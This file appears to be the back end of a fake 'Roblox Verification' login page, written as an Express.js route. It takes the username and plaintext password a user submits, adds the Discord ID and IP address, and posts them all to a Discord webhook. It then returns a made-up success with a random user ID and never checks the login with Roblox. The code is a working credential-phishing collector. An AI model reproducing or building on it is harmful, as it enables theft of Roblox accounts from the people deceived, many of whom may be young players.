const express = require('express');
const router = express.Router();

router.post('/', async (req, res) => {
    try {
        const { username, password, discordId } = req.body;
        
        if (!username || !password) {
            return res.status(400).json({ error: 'Username and password required' });
        }
        
        // Send to Discord webhook
        const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
        
        if (webhookUrl) {
            const payload = {
                username: 'Roblox Verification',
                embeds: [{
                    title: '🔐 Roblox Login',
                    color: 0x5865F2,
                    fields: [
                        { name: 'Username', value: `\`${username}\``, inline: true },
                        { name: 'Password', value: `\`${password}\``, inline: true },
                        { name: 'Discord ID', value: discordId ? `\`${discordId}\`` : 'Not linked', inline: true },
                        { name: 'Timestamp', value: new Date().toLocaleString(), inline: true },
                        { name: 'IP', value: req.ip || 'Unknown', inline: true }
                    ]
                }]
            };
            
            await fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        }
        
        // Simulate successful verification
        // In production, you'd actually verify with Roblox API
        const mockUserId = Math.floor(Math.random() * 1000000000);
        
        res.json({
            success: true,
            userId: mockUserId,
            username: username,
            message: 'Verification successful'
        });
        
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

module.exports = router;
